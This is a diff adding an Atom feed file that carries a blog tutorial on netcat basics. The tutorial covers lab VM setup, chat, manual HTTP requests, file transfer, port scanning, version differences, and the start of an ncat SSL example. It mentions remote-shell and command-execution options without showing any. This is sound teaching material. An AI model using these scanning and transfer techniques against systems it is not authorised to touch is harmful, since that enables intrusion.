@@ -1,0 +1,237 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>jclariviere - Cybersecurity</title><link href="https://jclariviere.com/" rel="alternate"></link><link href="https://jclariviere.com/feeds/cybersecurity.atom.xml" rel="self"></link><id>https://jclariviere.com/</id><updated>2024-12-19T00:00:00-05:00</updated><subtitle>Developer | Cybersecurity | DevOps</subtitle><entry><title>Netcat basics</title><link href="https://jclariviere.com/blog/post/netcat-basics/" rel="alternate"></link><published>2016-01-26T00:00:00-05:00</published><updated>2024-12-19T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:jclariviere.com,2016-01-26:/blog/post/netcat-basics/</id><summary type="html">&lt;p&gt;Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
+It can also work with UDP, do port scanning and even be used to execute &lt;a href="https://en.wikipedia.org/wiki/Shell_shoveling"&gt;remote shells&lt;/a&gt;.
+It's a commonly used …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
+It can also work with UDP, do port scanning and even be used to execute &lt;a href="https://en.wikipedia.org/wiki/Shell_shoveling"&gt;remote shells&lt;/a&gt;.
+It's a commonly used tool in &lt;a href="https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)"&gt;CTFs&lt;/a&gt; and cybersecurity in general.&lt;/p&gt;
+&lt;p&gt;This post will cover the basic usage.&lt;/p&gt;
+&lt;h2 id="testing-setup"&gt;Testing setup&lt;/h2&gt;
+&lt;p&gt;To test the connection between 2 machines, we will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see &lt;a href="https://jclariviere.com/blog/post/virtual-machines-with-vagrant/"&gt;this post&lt;/a&gt; for the basics.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;span class="filename"&gt;Vagrantfile&lt;/span&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"2"&lt;/span&gt;
+
+&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"kalilinux/rolling"&lt;/span&gt;
+
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"alice"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"alice"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"192.168.33.210"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"echo 192.168.33.211 bob &amp;gt;&amp;gt; /etc/hosts"&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
+
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"bob"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"bob"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"192.168.33.211"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"echo 192.168.33.210 alice &amp;gt;&amp;gt; /etc/hosts"&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
+
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"apt-get update &amp;amp;&amp;amp; apt-get install -y ncat&lt;/span&gt;
+&lt;span class="s2"&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Put this &lt;code&gt;Vagrantfile&lt;/code&gt; in a new folder and use &lt;code&gt;vagrant up&lt;/code&gt; to create the VMs.
+Then in 2 separate command prompts, use &lt;code&gt;vagrant ssh alice&lt;/code&gt; and &lt;code&gt;vagrant ssh bob&lt;/code&gt; to SSH into them.&lt;/p&gt;
+&lt;h2 id="basic-chat"&gt;Basic chat&lt;/h2&gt;
+&lt;p&gt;To see what netcat does, we will do a very basic chat.
+We'll simply connect the two machines, send hello messages from both sides then kill the connection (with &lt;code&gt;&amp;lt;Ctrl-C&amp;gt;&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;alice&lt;/code&gt; will act as the server and &lt;code&gt;bob&lt;/code&gt; as the client.
+Note that the "client" and "server" terms are only used for the connection setup.
+Once the connection is established, both sides can send and receive data.&lt;/p&gt;
+&lt;h3 id="server"&gt;Server&lt;/h3&gt;
+&lt;p&gt;To listen on a port: &lt;code&gt;nc -l -p &amp;lt;port&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-l&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="client"&gt;Client&lt;/h3&gt;
+&lt;p&gt;To connect to a TCP port: &lt;code&gt;nc &amp;lt;destination&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;.
+Destination can be an IP address or a DNS name.
+In our case, &lt;code&gt;alice&lt;/code&gt; was added to &lt;code&gt;/etc/hosts&lt;/code&gt; in the &lt;code&gt;Vagrantfile&lt;/code&gt; above.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="output"&gt;Output&lt;/h3&gt;
+&lt;p&gt;Here is the output from both machines.
+The &lt;code&gt;-v&lt;/code&gt; option is for &lt;code&gt;verbose&lt;/code&gt;, which shows the "listening on" and "connect to/from" messages.
+The &lt;code&gt;-n&lt;/code&gt; option tells netcat to skip the reverse DNS lookup.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41025&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;&amp;lt;Ctrl-C&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The highlighted lines are input sent from the prompt. As you can see, both sides can send and receive.&lt;/p&gt;
+&lt;h3 id="packets"&gt;Packets&lt;/h3&gt;
+&lt;p&gt;Here is the full conversation as captured by tcpdump (I grouped the packets so it's easier to follow).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;tcpdump&lt;span class="w"&gt; &lt;/span&gt;-i&lt;span class="w"&gt; &lt;/span&gt;eth1&lt;span class="w"&gt; &lt;/span&gt;-ttttt&lt;span class="w"&gt; &lt;/span&gt;port&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;tcpdump: verbose output suppressed, use -v or -vv for full protocol decode&lt;/span&gt;
+&lt;span class="go"&gt;listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes&lt;/span&gt;
+
+&lt;span class="go"&gt;00:00:00.000000 IP bob.41025 &amp;gt; alice.4444: Flags [S], seq 572573479, win 29200, options [mss 1460,sackOK,TS val 4294936802 ecr 0,nop,wscale 6], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:00.000029 IP alice.4444 &amp;gt; bob.41025: Flags [S.], seq 2846467502, ack 572573480, win 28960, options [mss 1460,sackOK,TS val 4294952445 ecr 4294936802,nop,wscale 6], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:00.000120 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 1, win 457, options [nop,nop,TS val 4294936802 ecr 4294952445], length 0&lt;/span&gt;
+
+&lt;span class="go"&gt;00:00:06.248799 IP alice.4444 &amp;gt; bob.41025: Flags [P.], seq 1:19, ack 1, win 453, options [nop,nop,TS val 4294954007 ecr 4294936802], length 18&lt;/span&gt;
+&lt;span class="go"&gt;00:00:06.249013 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 19, win 457, options [nop,nop,TS val 4294938364 ecr 4294954007], length 0&lt;/span&gt;
+
+&lt;span class="go"&gt;00:00:09.239254 IP bob.41025 &amp;gt; alice.4444: Flags [P.], seq 1:17, ack 19, win 457, options [nop,nop,TS val 4294939111 ecr 4294954007], length 16&lt;/span&gt;
+&lt;span class="go"&gt;00:00:09.239285 IP alice.4444 &amp;gt; bob.41025: Flags [.], ack 17, win 453, options [nop,nop,TS val 4294954754 ecr 4294939111], length 0&lt;/span&gt;
+
+&lt;span class="go"&gt;00:00:12.288043 IP bob.41025 &amp;gt; alice.4444: Flags [F.], seq 17, ack 19, win 457, options [nop,nop,TS val 4294939873 ecr 4294954754], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:12.288146 IP alice.4444 &amp;gt; bob.41025: Flags [F.], seq 19, ack 18, win 453, options [nop,nop,TS val 4294955517 ecr 4294939873], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:12.288380 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 20, win 457, options [nop,nop,TS val 4294939873 ecr 4294955517], length 0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;First 3 packets: standard tcp 3-way handshake (SYN, SYN-ACK, ACK).&lt;/li&gt;
+&lt;li&gt;Next 2: alice sending its hello message and bob's ack.&lt;/li&gt;
+&lt;li&gt;Next 2: bob sending its hello message and alice's ack.&lt;/li&gt;
+&lt;li&gt;Final 3: connection getting killed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="example-usages"&gt;Example usages&lt;/h2&gt;
+&lt;p&gt;Here are some interesting usages of netcat.&lt;/p&gt;
+&lt;h3 id="connecting-to-a-web-server"&gt;Connecting to a web server&lt;/h3&gt;
+&lt;p&gt;Simply connect to the web server on port 80. You can then do a manual HTTP request.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-C&lt;span class="w"&gt; &lt;/span&gt;perdu.com&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;GET / HTTP/1.1&lt;/span&gt;
+&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;Host: perdu.com&lt;/span&gt;
+&lt;/span&gt;
+&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+
+&lt;span class="go"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Vous Etes Perdu ?&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Perdu sur l'Internet ?&amp;lt;/h1&amp;gt;&amp;lt;h2&amp;gt;Pas de panique, on va vous aider&amp;lt;/h2&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;pre&amp;gt;    * &amp;lt;----- vous &amp;amp;ecirc;tes ici&amp;lt;/pre&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code&gt;-C&lt;/code&gt; option is to send CRLF instead of LF, &lt;a href="http://stackoverflow.com/a/5757349/3672769"&gt;following the HTTP standard&lt;/a&gt;.
+Note that the highlighted lines were typed manually.&lt;/p&gt;
+&lt;h3 id="piping-the-result-of-a-command"&gt;Piping the result of a command&lt;/h3&gt;
+&lt;p&gt;We could have avoided the manual typing in the previous example by piping the result of a command into netcat.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'GET / HTTP/1.1\r\nHost: perdu.com\r\n\r\n'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;perdu.com&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;
+&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+
+&lt;span class="go"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Vous Etes Perdu ?&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Perdu sur l'Internet ?&amp;lt;/h1&amp;gt;&amp;lt;h2&amp;gt;Pas de panique, on va vous aider&amp;lt;/h2&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;pre&amp;gt;    * &amp;lt;----- vous &amp;amp;ecirc;tes ici&amp;lt;/pre&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="transferring-files"&gt;Transferring files&lt;/h3&gt;
+&lt;p&gt;You can transfer files (it works for binaries too) using shell redirections.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;received-file
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41034&lt;/span&gt;
+
+&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;cat&lt;span class="w"&gt; &lt;/span&gt;received-file
+&lt;span class="hll"&gt;&lt;span class="go"&gt;This is text written by bob&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="hll"&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'This is text written by bob'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;file-to-transfer.txt
+&lt;/span&gt;
+&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="w"&gt; &lt;/span&gt;file-to-transfer.txt
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+
+&lt;span class="gp"&gt;vagrant@bob:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="port-scanning"&gt;Port scanning&lt;/h3&gt;
+&lt;p&gt;If you don't want to interact with the port and just want to verify if it's open, use the &lt;code&gt;-z&lt;/code&gt; option.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-vz&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;For a range (an extra &lt;code&gt;-v&lt;/code&gt; is needed to show the closed ports):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-vvz&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4443&lt;/span&gt;-4445
+&lt;span class="go"&gt;alice [192.168.33.210] 4445 (?) : Connection refused&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4443 (?) : Connection refused&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;For more advanced port scanning, you should use a real port scanner, such as &lt;a href="https://nmap.org"&gt;nmap&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id="differences-between-netcat-versions"&gt;Differences between netcat versions&lt;/h2&gt;
+&lt;p&gt;There are 2 main versions of netcat: traditional and OpenBSD.
+So far, we used the traditional version, installed by default on Kali Linux.&lt;/p&gt;
+&lt;p&gt;Here are the package descriptions (credits to &lt;a href="http://askubuntu.com/a/426320"&gt;this askubuntu question&lt;/a&gt;):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;apt-cache&lt;span class="w"&gt; &lt;/span&gt;show&lt;span class="w"&gt; &lt;/span&gt;netcat-traditional
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt; This is the "classic" netcat, written by *Hobbit*. It lacks many&lt;/span&gt;
+&lt;span class="go"&gt; features found in netcat-openbsd.&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="gp"&gt;$ &lt;/span&gt;apt-cache&lt;span class="w"&gt; &lt;/span&gt;show&lt;span class="w"&gt; &lt;/span&gt;netcat-openbsd
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt; This package contains the OpenBSD rewrite of netcat, including support&lt;/span&gt;
+&lt;span class="go"&gt; for IPv6, proxies, and Unix sockets.&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;There is also an important differences in the usage of the "listen" mode.
+They both use the &lt;code&gt;-l&lt;/code&gt; option, but the OpenBSD version doesn't use &lt;code&gt;-p&lt;/code&gt; to set the port.
+So it looks like this: &lt;code&gt;nc -l 4444&lt;/code&gt; instead of &lt;code&gt;nc -lp 4444&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The OpenBSD version also doesn't contain the command execution (&lt;code&gt;-e&lt;/code&gt; and &lt;code&gt;-c&lt;/code&gt;) options (more on that below).&lt;/p&gt;
+&lt;h2 id="encrypted-connections"&gt;Encrypted connections&lt;/h2&gt;
+&lt;p&gt;Neither traditional nor OpenBSD netcat support encryption.
+There is, however, a newer and improved implementation, called &lt;code&gt;ncat&lt;/code&gt;, that does.
+It is written by the &lt;a href="https://nmap.org"&gt;nmap&lt;/a&gt; team and has been bundled with nmap since &lt;a href="https://nmap.org/5/"&gt;version 5&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ncat [...] is the culmination of the currently splintered family of Netcat incarnations.&lt;/p&gt;
+&lt;p&gt;-- ncat manpage&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It supports all the options from both versions of netcat (including &lt;code&gt;-e&lt;/code&gt;/&lt;code&gt;-c&lt;/code&gt;) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... &lt;a href="https://nmap.org/ncat/guide/ncat-ssl.html"&gt;SSL&lt;/a&gt;!
+It's as simple as adding &lt;code&gt;--ssl&lt;/code&gt; to both sides.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;ncat&lt;span class="w"&gt; &lt;/span&gt;--ssl&lt;span class="w"&gt; &lt;/span&gt;-vl&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Version 6.40 ( http://nmap.org/ncat )&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Listening on :::4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Listening on 0.0.0.0:4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Connection from 192.168.33.211.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Connection from 192.168.33.211:41032.&lt;/span&gt;
